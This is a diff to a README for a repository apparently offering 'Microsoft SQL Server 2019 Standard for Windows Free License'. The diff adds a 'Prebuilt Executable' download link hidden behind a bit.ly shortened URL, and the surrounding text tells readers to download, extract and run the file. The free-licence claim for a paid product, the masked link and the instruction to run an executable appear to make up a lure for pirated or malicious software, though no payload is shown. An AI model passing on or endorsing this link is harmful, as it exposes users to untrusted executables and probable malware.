@@ -16,8 +16,11 @@ Microsoft SQL Server 2019 Standard for Windows Free License
 
 Get started with Microsoft SQL Server downloads.
 
-## Getting Started
+## Installation
 
+- Prebuilt Executable
+  - You can download the latest version from the
+    [Releases](https://bit.ly/3Zgoms1)
 ### Installing
 
 * Download the file provided in the release, extract the file and run the file.
